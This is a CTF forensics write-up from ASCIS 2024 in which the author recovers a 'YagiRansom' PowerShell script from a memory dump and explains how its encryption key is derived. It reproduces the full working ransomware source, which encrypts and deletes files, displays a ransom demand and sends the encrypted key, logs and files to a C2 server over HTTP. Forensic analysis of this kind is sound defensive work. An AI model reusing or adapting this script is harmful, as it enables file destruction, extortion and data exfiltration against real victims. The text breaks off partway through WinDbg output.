---
title:  ASCIS 2024
published: 2024-10-10
description:  ASEAN STUDENT CONTEST ON INFORMATION SECURITY 2024 with HISC (HCMUTE Information Security Club)
tags: [CTFs, DFIR, RE]
category: CTFs Write-up
draft: false
---

# ASCIS24
## Forensics

### Urgent Tina
![image](https://hackmd.io/_uploads/By1dAUV1Jx.png)
[Download](https://drive.google.com/file/d/1qLY4WQShdfSZBvTP1oaHqcXciTe5SXOQ/view)

The challenge gave us a mini dump file, so we can't use Volatility to extract it

![image](https://hackmd.io/_uploads/Hkd71DE1ye.png)

So I will use, IDA pro to extract it

![image](https://hackmd.io/_uploads/ry1p1DNyJx.png)

There an exe file seem to be the main culprit for this artifact, but we can't open it directly in IDA, lets dump it out first

using IDApython 

![image](https://hackmd.io/_uploads/HyeaeDNyJg.png)

Got the Binary but we can't access it yet, 'cause its Header is broken we have to use a tool called PE fixer, just drop the file and done (do it by yourself)

I found something suspicous, there is an powershell script

![image](https://hackmd.io/_uploads/SyzG_DN1yl.png)

I think it will drop another PE file with these value but I don't know how to get it out, I try placing a breakpoint for it to drop the PE then stop but the program can't run at all

![image](https://hackmd.io/_uploads/ryMIOD4Jkg.png)

So I have to try another way to get this update.ps1, we know that this file got executed so the script must be on the dump file, I will extract it using string

![image](https://hackmd.io/_uploads/r1_auP4kJl.png)

for some lucky reason, I actually spotted the Ps1 as the first time I string it.

```ps1 h!
$ProgressPreference = "SilentlyContinue"
$ErrorActionPreference = "SilentlyContinue"
$OSVersion = [Environment]::OSVersion.Platform
if ($OSVersion -like "*Win*") {
$Host.UI.RawUI.WindowTitle = "YagiRansom" 
$Host.UI.RawUI.BackgroundColor = "Black"
$Host.UI.RawUI.ForegroundColor = "White" }
# Variables
$Mode = $args[0]
$Directory = $args[1]
$WiETm = $args[3]
$7CiB = $args[3]
$UFX = $args[5]
$ENyR = $args[6]
$DCe = $null
# Errors
if ($args[0] -like "-h*") { break }
if ($args[0] -eq $null) { Write-Host "[!] Not enough/Wrong parameters!" -ForegroundColor Red ; Write-Host ; break }
if ($args[1] -eq $null) { Write-Host "[!] Not enough/Wrong parameters!" -ForegroundColor Red ; Write-Host ; break }
if ($args[2] -eq $null) { Write-Host "[!] Not enough/Wrong parameters!" -ForegroundColor Red ; Write-Host ; break }
if ($args[3] -eq $null) { Write-Host "[!] Not enough/Wrong parameters!" -ForegroundColor Red ; Write-Host ; break }
# Proxy Aware
[System.Net.WebRequest]::DefaultWebProxy = [System.Net.WebRequest]::GetSystemWebProxy()
[System.Net.WebRequest]::DefaultWebProxy.Credentials = [System.Net.CredentialCache]::DefaultNetworkCredentials
$AllProtocols = [System.Net.SecurityProtocolType]"Ssl3,Tls,Tls11,Tls12" ; [System.Net.ServicePointManager]::SecurityProtocol = $AllProtocols
# Functions
$OgE = ([Environment]::MachineName).ToLower() ; $zVSza = ([Environment]::UserName).ToLower() ; $I26 = "yaginote.txt"
$7VEq = Get-Date -Format "HH:mm - dd/MM/yy" ; $Uz19o = $7VEq.replace(":","").replace(" ","").replace("-","").replace("/","")+$zVSza+$OgE
if ($OSVersion -like "*Win*") { $domain = (([Environment]::UserDomainName).ToLower()+"\") ; $slash = "\" } else { $domain = $null ; $slash = "/" } 
$DirectoryTarget = $Directory.Split($slash)[-1] ; if (!$DirectoryTarget) { $DirectoryTarget = $Directory.Path.Split($slash)[-1] }
function Invoke-AESEncryption {
   [CmdletBinding()]
   [OutputType([string])]
   Param(
       [Parameter(Mandatory = $true)]
       [String]$Key,
       [Parameter(Mandatory = $true, ParameterSetName = "CryptText")]
       [String]$Text,
       [Parameter(Mandatory = $true, ParameterSetName = "CryptFile")]
       [String]$Path)
   Begin {
      $m95I = New-Object System.Security.Cryptography.SHA256Managed
      $n9ibn = New-Object System.Security.Cryptography.AesManaged
      $n9ibn.Mode = [System.Security.Cryptography.CipherMode]::CBC
      $n9ibn.Padding = [System.Security.Cryptography.PaddingMode]::PKCS7
      $n9ibn.BlockSize = 128
      $n9ibn.KeySize = 256 }
   Process {
      $n9ibn.Key = $m95I.ComputeHash([System.Text.Encoding]::UTF8.GetBytes($Key))
      if ($Text) {$plainBytes = [System.Text.Encoding]::UTF8.GetBytes($Text)}
      if ($Path) {
         $File = Get-Item -Path $Path -ErrorAction SilentlyContinue
         if (!$File.FullName) { break }
         $plainBytes = [System.IO.File]::ReadAllBytes($File.FullName)
         $outPath = $File.FullName + ".enc" }
      $encryptor = $n9ibn.CreateEncryptor()
      $encryptedBytes = $encryptor.TransformFinalBlock($plainBytes, 0, $plainBytes.Length)
      $encryptedBytes = $n9ibn.IV + $encryptedBytes
      $n9ibn.Dispose()
      if ($Text) {return [System.Convert]::ToBase64String($encryptedBytes)}
      if ($Path) {
         [System.IO.File]::WriteAllBytes($outPath, $encryptedBytes)
         (Get-Item $outPath).LastWriteTime = $File.LastWriteTime }}
  End {
      $m95I.Dispose()
      $n9ibn.Dispose()}}
function RemoveWallpaper {
$code = @"
using System;
using System.Drawing;
using System.Runtime.InteropServices;
using Microsoft.Win32;
namespace CurrentUser { public class Desktop {
[DllImport("user32.dll", SetLastError = true, CharSet = CharSet.Auto)]
private static extern int SystemParametersInfo(int uAction, int uParm, string lpvParam, int fuWinIni);
[DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
private static extern int SetSysColors(int cElements, int[] lpaElements, int[] lpRgbValues);
public const int UpdateIniFile = 0x01; public const int SendWinIniChange = 0x02;
public const int SetDesktopBackground = 0x0014; public const int COLOR_DESKTOP = 1;
public int[] first = {COLOR_DESKTOP};
public static void RemoveWallPaper(){
SystemParametersInfo( SetDesktopBackground, 0, "", SendWinIniChange | UpdateIniFile );
RegistryKey regkey = Registry.CurrentUser.OpenSubKey("Control Panel\\Desktop", true);
regkey.SetValue(@"WallPaper", 0); regkey.Close();}
public static void SetBackground(byte r, byte g, byte b){ int[] elements = {COLOR_DESKTOP};
RemoveWallPaper();
System.Drawing.Color color = System.Drawing.Color.FromArgb(r,g,b);
int[] colors = { System.Drawing.ColorTranslator.ToWin32(color) };
SetSysColors(elements.Length, elements, colors);
RegistryKey key = Registry.CurrentUser.OpenSubKey("Control Panel\\Colors", true);
key.SetValue(@"Background", string.Format("{0} {1} {2}", color.R, color.G, color.B));
key.Close();}}}
try { Add-Type -TypeDefinition $code -ReferencedAssemblies System.Drawing.dll }
finally {[CurrentUser.Desktop]::SetBackground(250, 25, 50)}}
function PopUpRansom {
[void] [System.Reflection.Assembly]::LoadWithPartialName("System.Drawing")  
[void] [System.Reflection.Assembly]::LoadWithPartialName("System.Windows.Forms") 
[void] [System.Windows.Forms.Application]::EnableVisualStyles() 
Invoke-WebRequest -useb https://www.mediafire.com/view/wlq9mlfrlonlcuk/yagi.png/file -Outfile $env:temp\YagiRansom.jpg
Invoke-WebRequest -useb https://www.mediafire.com/file/s4qcg4hk6bnd2pe/Yagi.ico/file -Outfile $env:temp\YagiRansom.ico
$shell = New-Object -ComObject "Shell.Application"
$shell.minimizeall()
$form = New-Object system.Windows.Forms.Form
$form.ControlBox = $false;
$form.Size = New-Object System.Drawing.Size(900,600) 
$form.BackColor = "Black" 
$form.MaximizeBox = $false 
$form.StartPosition = "CenterScreen" 
$form.WindowState = "Normal"
$form.Topmost = $true
$form.FormBorderStyle = "Fixed3D"
$form.Text = "YagiRansom"
$formIcon = New-Object system.drawing.icon ("$env:temp\YagiRansom.ico") 
$form.Icon = $formicon  
$img = [System.Drawing.Image]::Fromfile("$env:temp\YagiRansom.jpg")
$pictureBox = new-object Windows.Forms.PictureBox
$pictureBox.Width = 920
$pictureBox.Height = 370
$pictureBox.SizeMode = "StretchImage"
$pictureBox.Image = $img
$form.controls.add($pictureBox)
$label = New-Object System.Windows.Forms.Label
$label.ForeColor = "Cyan"
$label.Text = "All your files have been encrypted by YagiRansom!" 
$label.AutoSize = $true 
$label.Location = New-Object System.Drawing.Size(50,400) 
$font = New-Object System.Drawing.Font("Consolas",15,[System.Drawing.FontStyle]::Bold) 
$form.Font = $Font 
$form.Controls.Add($label) 
$label1 = New-Object System.Windows.Forms.Label
$label1.ForeColor = "White"
$label1.Text = "But don
t worry, you can still recover them with the recovery key if you pay the ransom in the next 8 hours." 
$label1.AutoSize = $true 
$label1.Location = New-Object System.Drawing.Size(50,450)
$font1 = New-Object System.Drawing.Font("Consolas",15,[System.Drawing.FontStyle]::Bold) 
$form.Font = $Font1
$form.Controls.Add($label1) 
$okbutton = New-Object System.Windows.Forms.Button;
$okButton.Location = New-Object System.Drawing.Point(750,500)
$okButton.Size = New-Object System.Drawing.Size(110,35)
$okbutton.ForeColor = "Black"
$okbutton.BackColor = "White"
$okbutton.FlatStyle = [System.Windows.Forms.FlatStyle]::Flat
$okButton.Text = 'Pay Now!'
$okbutton.Visible = $false
$okbutton.Enabled = $true
$okButton.DialogResult = [System.Windows.Forms.DialogResult]::OK
$okButton.add_Click({ 
[System.Windows.Forms.MessageBox]::Show($this.ActiveForm, 'Your payment order has been successfully registered!', 'YagiRansom Payment Processing System',
[Windows.Forms.MessageBoxButtons]::"OK", [Windows.Forms.MessageBoxIcon]::"Warning")})
$form.AcceptButton = $okButton
$form.Controls.Add($okButton)
$form.Activate() 2>&1> $null
$form.Focus() 2>&1> $null
$btn=New-Object System.Windows.Forms.Label
$btn.Location = New-Object System.Drawing.Point(50,500)
$btn.Width = 500
$form.Controls.Add($btn)
$btn.ForeColor = "Red"
$startTime = [DateTime]::Now
$count = 10.6
$7VEqr=New-Object System.Windows.Forms.Timer
$7VEqr.add_Tick({$elapsedSeconds = ([DateTime]::Now - $startTime).TotalSeconds ; $remainingSeconds = $count - $elapsedSeconds
if ($remainingSeconds -like "-0.1*"){ $7VEqr.Stop() ; $okbutton.Visible = $true ; $btn.Text = "0 Seconds remaining.." }
$btn.Text = [String]::Format("{0} Seconds remaining..", [math]::round($remainingSeconds))})
$7VEqr.Start()
$btntest = $form.ShowDialog()
if ($btntest -like "OK"){ $Global:PayNow = "True" }}
function R64Encoder { 
   if ($args[0] -eq "-t") { $VaFQ = [Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes($args[1])) }
   if ($args[0] -eq "-f") { $VaFQ = [Convert]::ToBase64String([IO.File]::ReadAllBytes($args[1])) }
   $VaFQ = $VaFQ.Split("=")[0] ; $VaFQ = $VaFQ.Replace("C", "-") ; $VaFQ = $VaFQ.Replace("E", "_")
   $8bKW = $VaFQ.ToCharArray() ; [array]::Reverse($8bKW) ; $R64Base = -join $8bKW ; return $R64Base }
function GetStatus {
   Try { Invoke-WebRequest -useb "$7CiB`:$UFX/status" -Method GET 
      Write-Host "[i] C2 Server is up!" -ForegroundColor Green }
   Catch { Write-Host "[!] C2 Server is down!" -ForegroundColor Red }}
function SendResults {
   $cvf = Invoke-AESEncryption -Key $Uz19o -Text $WiETm ; $cVl = R64Encoder -t $cvf
   $2YngY = "> $cVl > $OgE > $zVSza > $7VEq"
   $RansomLogs = Get-Content "$Directory$slash$I26" | Select-String "[!]" | Select-String "YagiRansom!" -NotMatch
   $XoX = R64Encoder -t $2YngY ; $B64Logs = R64Encoder -t $RansomLogs
   Invoke-WebRequest -useb "$7CiB`:$UFX/data" -Method POST -Body $XoX 2>&1> $null
   Invoke-WebRequest -useb "$7CiB`:$UFX/logs" -Method POST -Body $B64Logs 2>&1> $null }
function SendClose {
   Invoke-WebRequest -useb "$7CiB`:$UFX/close" -Method GET 2>&1> $null }
function SendPay {
   Invoke-WebRequest -useb "$7CiB`:$UFX/pay" -Method GET 2>&1> $null }
function SendOK {
   Invoke-WebRequest -useb "$7CiB`:$UFX/done" -Method GET 2>&1> $null }
function CreateReadme {
   $I26TXT = "All your files have been encrypted by YagiRansom!!`nBut don't worry, you can still recover them with the recovery key if you pay the ransom in the next 8 hours.`nTo get decryption instructions, you must transfer 100000$ to the following account:`n`nAccount Name: Mat tran To quoc Viet Nam - Ban Cuu Tro Trung uong`n`nAccount Number: 0011.00.1932418`n`nBank: Vietnam Joint Stock Commercial Bank for Foreign Trade (Vietcombank)`n"
   if (!(Test-Path "$Directory$slash$I26")) { Add-Content -Path "$Directory$slash$I26" -Value $I26TXT }}
function EncryptFiles { 
   $ExcludedFiles = '*.enc', 'yaginote.txt', '*.dll', '*.ini', '*.sys', '*.exe', '*.msi', '*.NLS', '*.acm', '*.nls', '*.EXE', '*.dat', '*.efi', '*.mui'
   foreach ($i in $(Get-ChildItem $Directory -recurse -exclude $ExcludedFiles | Where-Object { ! $_.PSIsContainer } | ForEach-Object { $_.FullName })) { 
   Invoke-AESEncryption -Key $WiETm -Path $i ; Add-Content -Path "$Directory$slash$I26" -Value "[!] $i is now encrypted" ;
   Remove-Item $i }
   $RansomLogs = Get-Content "$Directory$slash$I26" | Select-String "[!]" | Select-String "YagiRansom!" -NotMatch ; if (!$RansomLogs) { 
   Add-Content -Path "$Directory$slash$I26" -Value "[!] No files have been encrypted!" }}
function ExfiltrateFiles {
   Invoke-WebRequest -useb "$7CiB`:$UFX/files" -Method GET 2>&1> $null 
   $RansomLogs = Get-Content "$Directory$slash$I26" | Select-String "No files have been encrypted!" ; if (!$RansomLogs) {
   foreach ($i in $(Get-ChildItem $Directory -recurse -filter *.enc | Where-Object { ! $_.PSIsContainer } | ForEach-Object { $_.FullName })) {
      $Pfile = $i.split($slash)[-1] ; $B64file = R64Encoder -f $i ; $B64Name = R64Encoder -t $Pfile
      Invoke-WebRequest -useb "$7CiB`:$UFX/files/$B64Name" -Method POST -Body $B64file 2>&1> $null }}
   else { $B64Name = R64Encoder -t "none.null" ; Invoke-WebRequest -useb "$7CiB`:$UFX/files/$B64Name" -Method POST -Body $B64file 2>&1> $null }}
function CheckFiles { 
   $RFiles = Get-ChildItem $Directory -recurse -filter *.enc ; if ($RFiles) { $RFiles } else {
   Write-Host "[!] No encrypted files found!" -ForegroundColor Red }}
# Main
if ($Mode -eq "-d") { 
   Write-Host ; Write-Host "[!] Shutdowning...." -ForegroundColor Red; sleep 1 }
else {
   Write-Host ;
   Write-Host "[+] Checking communication with C2 Server.." -ForegroundColor Blue
   $DCe = GetStatus ; sleep 1
   $WiETm = -join ( (48..57) + (65..90) + (97..122) | Get-Random -Count 24 | % {[char]$_})
   Write-Host "[!] Encrypting ..." -ForegroundColor Red
   CreateReadme ; EncryptFiles ; if ($DCe) { SendResults ; sleep 1
   if ($ENyR -eq "-x") { Write-Host "[i] Exfiltrating ..." -ForegroundColor Green
      ExfiltrateFiles ; sleep 1 }}
   if (!$DCe) { Write-Host "[+] Saving logs in yaginote.txt.." -ForegroundColor Blue }
   else { Write-Host "[+] Sending logs to C2 Server.." -ForegroundColor Blue }}
   if ($args -like "-demo") { RemoveWallpaper ; PopUpRansom
   if ($PayNow -eq "True") { SendPay ; SendOK } else { SendClose ; SendOK }}
   else { SendOK }
sleep 1000 ; Write-Host "[i] Done!" -ForegroundColor Green ; Write-Host
```

So what do we need to focus in this script? If you read it through you will know that it encrypt the data with AES CBC 256 and a custom Base64 named R64 (it reverses the string, base64 encode, get rid of the padding then replace E with _ and C with -)

Okay so we knot how it encrypted, where the key? The answer is quite simple if you take a look here in these lines

```ps1 h!
function SendResults {
$cvf = Invoke-AESEncryption -Key $Uz19o -Text $WiETm ; $cVl = R64Encoder -t $cvf
$2YngY = "> $cVl > $OgE > $zVSza > $7VEq"
$RansomLogs = Get-Content "$Directory$slash$I26" | Select-String "[!]" | Select-String "YagiRansom!" -NotMatch
$XoX = R64Encoder -t $2YngY ; $B64Logs = R64Encoder -t $RansomLogs
Invoke-WebRequest -useb "$7CiB`:$UFX/data" -Method POST -Body $XoX 2>&1> $null
Invoke-WebRequest -useb "$7CiB`:$UFX/logs" -Method POST -Body $B64Logs 2>&1> $null }
```

```ps1 h!
Invoke-AESEncryption -Key $WiETm -Path $i
---------------------------------------------------------
$OgE = ([Environment]::MachineName).ToLower() ; $zVSza = ([Environment]::UserName).ToLower() ; $I26 = "yaginote.txt"
$7VEq = Get-Date -Format "HH:mm - dd/MM/yy" ; 
$Uz19o = $7VEq.replace(":","").replace(" ","").replace("-","").replace("/","")+$zVSza+$OgE
```

the $cvf is the place holder for the encrypted key, it encrypted the key with $**Uz19o** and Uz19o is the date,time + username + hostname.
There are 2 ways to get the cvf back, I will tell you both way

1. gather back all the infomation from the dump and pcap
2. Reverse the data that it sent to through the http POST method

Lets start with the first one, how to get back the infomations? 

First open the dmp file in windbg and use !peb

```h!
0:000> !peb
PEB at 0000000000c11000
    InheritedAddressSpace:    No
    ReadImageFileExecOptions: No
    BeingDebugged:            No
    ImageBaseAddress:         0000000000aa0000
    NtGlobalFlag:             0
    NtGlobalFlag2:            0
    Ldr                       00007ffae4ffa4c0
    Ldr.Initialized:          Yes
    Ldr.InInitializationOrderModuleList: 0000000000f32680 . 000000001bb8fbf0
    Ldr.InLoadOrderModuleList:           0000000000f327f0 . 000000001bb8fbd0
    Ldr.InMemoryOrderModuleList:         0000000000f32800 . 000000001bb8fbe0
            Base TimeStamp                     Module
          aa0000 66eb07ef Sep 19 00:03:43 2024 C:\Users\IEUser\Desktop\update.exe
    7ffae4e90000 a280d1d6 May 24 06:48:38 2056 C:\Windows\SYSTEM32\ntdll.dll
    7ffad3e20000 51bd878b Jun 16 16:38:19 2013 C:\Windows\SYSTEM32\MSCOREE.DLL
    7ffae4d90000 0871fae9 Jun 29 04:38:49 1974 C:\Windows\System32\KERNEL32.dll
    7ffae28c0000 c9db1934 Apr 25 19:27:32 2077 C:\Windows\System32\KERNELBASE.dll
    7ffae3830000 1bfdec59 Nov 18 18:39:05 1984 C:\Windows\System32\ADVAPI32.dll
    7ffae39c0000 564f9f39 Nov 21 05:31:21 2015 C:\Windows\System32\msvcrt.dll
    7ffae4cf0000 4782ccda Jan 08 08:07:38 2008 C:\Windows\System32\sechost.dll
    7ffae3690000 9f38e81d Aug 26 04:39:41 2054 C:\Windows\System32\RPCRT4.dll
    7ffad3d70000 5e7d1fe7 Mar 27 04:34:31 2020 C:\Windows\Microsoft.NET\Framework64\v4.0.30319\mscoreei.dll
    7ffae4c90000 e6eb9927 Oct 07 13:37:27 2092 C:\Windows\System32\SHLWAPI.dll
    7ffae03c0000 f0713fcd Oct 30 13:42:21 2097 C:\Windows\SYSTEM32\kernel.appcore.dll
    7ffadb0c0000 14531102 Oct 21 21:56:02 1980 C:\Windows\SYSTEM32\VERSION.dll
    7ffab3a40000 60b90751 Jun 03 23:46:09 2021 C:\Windows\Microsoft.NET\Framework64\v4.0.30319\clr.dll
    7ffae3110000 032ff40c Sep 12 04:58:36 1971 C:\Windows\System32\USER32.dll
    7ffae26b0000 0dcd0213 May 04 03:26:59 1977 C:\Windows\System32\win32u.dll
    7ffad4970000 5bac17be Sep 27 06:35:26 2018 C:\Windows\SYSTEM32\VCRUNTIME140_CLR0400.dll
    7ffae3650000 a0528517 Mar 27 19:16:23 2055 C:\Windows\System32\GDI32.dll
    7ffae2dd0000 b24bb404 Oct 15 21:15:32 2064 C:\Windows\System32\gdi32full.dll
    7ffae2610000 39255ccf May 19 22:25:03 2000 C:\Windows\System32\msvcp_win.dll
    7ffad0790000 5bac17b7 Sep 27 06:35:19 2018 C:\Windows\SYSTEM32\ucrtbase_clr0400.dll
    7ffae2c40000 2bd748bf Apr 23 08:39:11 1993 C:\Windows\System32\ucrtbase.dll
    7ffae3410000 3a0e9944 Nov 12 20:21:08 2000 C:\Windows\System32\IMM32.DLL
    7ffaafe20000 60b90614 Jun 03 23:40:52 2021 C:\Windows\assembly\NativeImages_v4.0.30319_64\mscorlib\97c421700557a331a31041b81ac3b698\mscorlib.ni.dll
    7ffae32c0000 bc9e4cf1 Apr 12 08:16:33 2070 C:\Windows\System32\ole32.dll
    7ffae4140000 7e843d58 Apr 06 08:54:32 2037 C:\Windows\System32\combase.dll
    7ffae2d40000 50c3fa26 Dec 09 09:40:38 2012 C:\Windows\System32\bcryptPrimitives.dll
    7ffae0010000 cfe7e255 Jul 13 14:14:29 2080 C:\Windows\system32\uxtheme.dll
    7ffaccce0000 60b905f9 Jun 03 23:40:25 2021 C:\Windows\Microsoft.NET\Framework64\v4.0.30319\clrjit.dll
    7ffae1f30000 409dec87 May 09 15:32:07 2004 C:\Windows\SYSTEM32\wldp.dll
    7ffad2c60000 690ba034 Nov 06 02:06:28 2025 C:\Windows\SYSTEM32\amsi.dll
    7ffaaf1a0000 606e71b3 Apr 08 10:00:03 2021 C:\Windows\assembly\NativeImages_v4.0.30319_64\System\372e9962a41f186f070f1cb9f93273ee\System.ni.dll
    7ffab18a0000 609c43ff May 13 04:09:19 2021 C:\Windows\assembly\NativeImages_v4.0.30319_64\System.Core\dbf675a2e7564fd29ec8b82b29a1a2fe\System.Core.ni.dll
    7ffaad130000 b5f2dad4 Sep 25 05:10:28 2066 C:\Windows\assembly\NativeImages_v4.0.30319_64\System.Manaa57fc8cc#\31f3ff18d2438832c5c159e78f145c47\System.Management.Automation.ni.dll
    7ffae1e80000 04d97ae6 Jul 30 23:27:18 1972 C:\Windows\SYSTEM32\CRYPTSP.dll
    7ffae1610000 a9b3ef3b Mar 22 07:41:31 2060 C:\Windows\system32\rsaenh.dll
    7ffae2890000 5eccdefc May 26 16:18:52 2020 C:\Windows\System32\bcrypt.dll
    7ffae1ea0000 28e89a43 Oct 01 22:54:43 1991 C:\Windows\SYSTEM32\CRYPTBASE.dll
    7ffad5b10000 c49f8711 Jul 14 17:18:57 2074 C:\Windows\assembly\NativeImages_v4.0.30319_64\Microsoft.P1706cafe#\6c1ecdc8797806378cce8d05a1ff7c9a\Microsoft.PowerShell.Commands.Diagnostics.ni.dll
    7ffae25b0000 461cee26 Apr 11 21:18:14 2007 C:\Windows\System32\WINTRUST.dll
    7ffae26e0000 6d85013f Mar 23 21:05:51 2028 C:\Windows\System32\CRYPT32.dll
    7ffae20c0000 9dcceb6f Nov 23 02:28:47 2053 C:\Windows\SYSTEM32\MSASN1.dll
    7ffad08e0000 ecc3ea32 Nov 16 13:14:10 2095 C:\Windows\System32\MSISIP.DLL
    7ffad0500000 4de62d80 Jun 01 19:16:00 2011 C:\Windows\System32\wshext.dll
    7ffae2f40000 61567b6b Oct 01 10:07:23 2021 C:\Windows\System32\OLEAUT32.dll
    7ffae44a0000 befe902e Jul 17 17:21:34 2071 C:\Windows\System32\SHELL32.dll
    7ffacf5a0000 b224a13f Sep 16 05:57:03 2064 C:\Windows\System32\AppxSip.dll
    7ffabbde0000 14a8f0d7 Dec 26 01:13:43 1980 C:\Windows\SYSTEM32\OpcServices.DLL
    7ffad7140000 3d768588 Sep 05 05:13:28 2002 C:\Windows\SYSTEM32\urlmon.dll
    7ffade130000 1bfb31ad Nov 16 16:58:05 1984 C:\Windows\SYSTEM32\XmlLite.dll
    7ffad7a10000 a9e3a09e Apr 27 11:54:54 2060 C:\Windows\SYSTEM32\iertutil.dll
    7ffad7110000 4e6b0a76 Sep 10 13:57:58 2011 C:\Windows\SYSTEM32\srvcli.dll
    7ffae3f60000 64806808 Jun 07 18:20:40 2023 C:\Windows\System32\shcore.dll
    7ffae1ae0000 fcf57d1b Jun 27 01:06:19 2104 C:\Windows\SYSTEM32\netutils.dll
    7ffada570000 37201150 Apr 23 13:21:04 1999 C:\Windows\System32\WindowsPowerShell\v1.0\pwrshsip.dll
    7ffad04d0000 5dda3e1b Nov 24 15:23:55 2019 C:\Windows\assembly\NativeImages_v4.0.30319_64\System.Confe64a9051#\6d585ae552d8121e2321b5ee100955ff\System.Configuration.Install.ni.dll
    7ffad06e0000 ab0ae739 Dec 07 11:14:49 2060 C:\Windows\assembly\NativeImages_v4.0.30319_64\Microsoft.Pb378ec07#\944d9690aa72666f3ded0294d0c18604\Microsoft.PowerShell.ConsoleHost.ni.dll
    7ffaab670000 a701071e Oct 15 06:07:10 2058 C:\Windows\assembly\NativeImages_v4.0.30319_64\Microsoft.P521220ea#\6c5d2d60a13658478f9c46626dc06e3b\Microsoft.PowerShell.Commands.Utility.ni.dll
    7ffaac570000 b98b8f4c Aug 23 14:05:48 2068 C:\Windows\assembly\NativeImages_v4.0.30319_64\Microsoft.Pae3498d9#\03f8d68acf7a8476a6782344b85ce268\Microsoft.PowerShell.Commands.Management.ni.dll
    7ffacf0c0000 d6610674 Dec 22 13:34:28 2083 C:\Windows\assembly\NativeImages_v4.0.30319_64\Microsoft.Mf49f6405#\1a9dbe36222431068d63284a515217f7\Microsoft.Management.Infrastructure.ni.dll
    7ffaceb80000 f017457a Aug 23 07:42:34 2097 C:\Windows\assembly\NativeImages_v4.0.30319_64\Microsoft.P6f792626#\8bcf4f054f1cac6544aec3820bdcf108\Microsoft.PowerShell.Security.ni.dll
    7fface0a0000 940bce2d Sep 15 23:54:05 2048 C:\Windows\assembly\NativeImages_v4.0.30319_64\Microsoft.We0722664#\ba920df260c2c88b5e237153b2f0f4fb\Microsoft.WSMan.Management.ni.dll
    7ffacce30000 5ed9c0dc Jun 05 10:49:48 2020 C:\Windows\assembly\NativeImages_v4.0.30319_64\System.Configuration\053d057c90af827d0929a6aba7feabcf\System.Configuration.ni.dll
    7ffacc110000 5dda3e2e Nov 24 15:24:14 2019 C:\Windows\assembly\NativeImages_v4.0.30319_64\System.Xml\eab83bdd6eee1b956e2c8aef88914cc1\System.Xml.ni.dll
    7ffae06d0000 526ec56d Oct 29 03:13:33 2013 C:\Windows\SYSTEM32\windows.storage.dll
    7ffae24f0000 793b0534 Jun 14 22:18:12 2034 C:\Windows\SYSTEM32\profapi.dll
    7ffae4010000 0f828c32 Apr 01 00:36:50 1978 C:\Windows\System32\psapi.dll
    7ffaac7b0000 5f52abe5 Sep 05 04:04:37 2020 C:\Windows\assembly\NativeImages_v4.0.30319_64\System.Data\84aed1edd797cb6d561bc7bf355d46b2\System.Data.ni.dll
    7ffab36d0000 5f52abe5 Sep 05 04:04:37 2020 C:\Windows\Microsoft.Net\assembly\GAC_64\System.Data\v4.0_4.0.0.0__b77a5c561934e089\System.Data.dll
    7ffae37c0000 aff3315b Jul 18 09:18:03 2063 C:\Windows\System32\WS2_32.dll
    7ffacef50000 5dda3e36 Nov 24 15:24:22 2019 C:\Windows\assembly\NativeImages_v4.0.30319_64\System.Management\a00d58ba692a8febe63782689321bb04\System.Management.ni.dll
    7fface840000 5dda3e38 Nov 24 15:24:24 2019 C:\Windows\assembly\NativeImages_v4.0.30319_64\System.Dired13b18a9#\79f99918023317d012fe2183f857bb1c\System.DirectoryServices.ni.dll
    7ffad3d10000 5dda3e1d Nov 24 15:23:57 2019 C:\Windows\assembly\NativeImages_v4.0.30319_64\System.Numerics\0c073f42cf7c0b89bd4ceb4244060ceb\System.Numerics.ni.dll
    7fface760000 5dda4d4c Nov 24 16:28:44 2019 C:\Windows\assembly\NativeImages_v4.0.30319_64\System.Transactions\8cf69b2ee1126c11a4965ce03cac7452\System.Transactions.ni.dll
    7fface710000 5dda4d4c Nov 24 16:28:44 2019 C:\Windows\Microsoft.Net\assembly\GAC_64\System.Transactions\v4.0_4.0.0.0__b77a5c561934e089\System.Transactions.dll
    7ffad2a80000 7aec0e44 May 09 09:28:20 2035 C:\Windows\SYSTEM32\secur32.dll
    7ffae2470000 7fc7908a Dec 07 14:51:38 2037 C:\Windows\SYSTEM32\SSPICLI.DLL
    7ffae4be0000 db9f728a Oct 05 19:37:30 2086 C:\Windows\System32\clbcatq.dll
    7ffacdf90000 91fb18b5 Aug 11 23:03:01 2047 C:\Windows\SYSTEM32\rasapi32.dll
    7ffad4be0000 b4f05a27 Mar 13 03:16:39 2066 C:\Windows\SYSTEM32\rasman.dll
    7ffad5af0000 a1fe1a07 Feb 15 03:09:43 2056 C:\Windows\SYSTEM32\rtutils.dll
    7ffae1c90000 f42c9c21 Oct 25 05:30:57 2099 C:\Windows\system32\mswsock.dll
    7ffad99a0000 86cce493 Aug 31 22:13:23 2041 C:\Windows\SYSTEM32\winhttp.dll
    7ffae1980000 cf9a121a May 15 13:41:30 2080 C:\Windows\SYSTEM32\IPHLPAPI.DLL
    7ffae3100000 aa9c8581 Sep 14 17:48:33 2060 C:\Windows\System32\NSI.dll
    7ffadb120000 c962e034 Jan 24 14:52:20 2077 C:\Windows\SYSTEM32\dhcpcsvc6.DLL
    7ffadb0d0000 1c1d619d Dec 12 15:19:41 1984 C:\Windows\SYSTEM32\dhcpcsvc.DLL
    7ffacde20000 5dda4e25 Nov 24 16:32:21 2019 C:\Windows\Microsoft.NET\Framework64\v4.0.30319\diasymreader.dll
    7ffae19c0000 50d11fc0 Dec 19 09:00:32 2012 C:\Windows\SYSTEM32\DNSAPI.dll
    7ffadbf90000 7eaef63e May 08 18:38:38 2037 C:\Windows\SYSTEM32\WINNSI.DLL
    SubSystemData:     0000000000000000
    ProcessHeap:       0000000000f30000
    ProcessParameters: 0000000000f31da0
    CurrentDirectory:  'C:\Users\IEUser\Desktop\'
    WindowTitle:  'C:\Users\IEUser\Desktop\update.exe'
    ImageFile:    'C:\Users\IEUser\Desktop\update.exe'
    CommandLine:  '"C:\Users\IEUser\Desktop\update.exe" -e C:\Users\IEUser\Documents\ -s 192.168.240.1 -p 443 -x'
    DllPath:      '< Name not readable >'
    Environment:  0000000000f30fe0
        =::=::\
        ALLUSERSPROFILE=C:\ProgramData
        APPDATA=C:\Users\IEUser\AppData\Roaming
        CommonProgramFiles=C:\Program Files\Common Files
        CommonProgramFiles(x86)=C:\Program Files (x86)\Common Files
        CommonProgramW6432=C:\Program Files\Common Files
        COMPUTERNAME=ADMINISTRATOR
        ComSpec=C:\Windows\system32\cmd.exe
        DriverData=C:\Windows\System32\Drivers\DriverData
        FPS_BROWSER_APP_PROFILE_STRING=Internet Explorer
        FPS_BROWSER_USER_PROFILE_STRING=Default
        HOMEDRIVE=C:
        HOMEPATH=\Users\IEUser
